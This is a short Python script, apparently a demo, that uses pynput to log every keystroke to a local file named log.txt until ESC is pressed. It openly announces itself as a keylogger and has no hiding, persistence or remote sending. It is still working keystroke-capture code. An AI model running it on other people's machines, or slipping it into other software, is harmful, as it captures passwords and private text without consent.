from pynput import keyboard

logFile = "log.txt"

def press(key):
    try:
        # prints typical characters such as letters or numbers
        key = key.char
    except AttributeError:
        # prints special keys such as ctrl or shift
        key = str(key)

    with open(logFile, "a") as file:
        file.write(f"{key}\n")

def release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped")
        return False


if __name__ == "__main__":
    print("Keylogger started, press ESC to exit")

    with keyboard.Listener(on_press=press, on_release=release) as listener:
        listener.join()